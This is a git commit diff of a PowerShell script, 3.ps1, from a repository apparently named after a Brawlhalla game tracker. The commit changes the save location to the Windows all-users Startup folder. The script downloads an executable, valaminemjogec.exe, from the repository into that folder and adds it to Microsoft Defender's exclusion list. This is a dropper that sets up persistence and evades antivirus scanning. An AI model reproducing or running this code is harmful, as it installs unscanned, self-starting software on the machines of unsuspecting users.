8b19c5e7eddfebdef5035a3c83b047ef978142f6
FCsab <161705557+FCsab@users.noreply.github.com>
2025-06-24 16:13:57 +0200

    Update 3.ps1

--- 3.ps1
+++ 3.ps1
@@ -1,4 +1,4 @@
-$startupFolder = $env:APPDATA
+$startupFolder = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
 $url = "https://github.com/FCsab/Brawlhalla-Tracker/blob/main/valaminemjogec.exe?raw=true"
 $outputPath = Join-Path $startupFolder "valaminemjogec.exe"
 Add-MpPreference -ExclusionPath "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\valaminemjogec.exe"
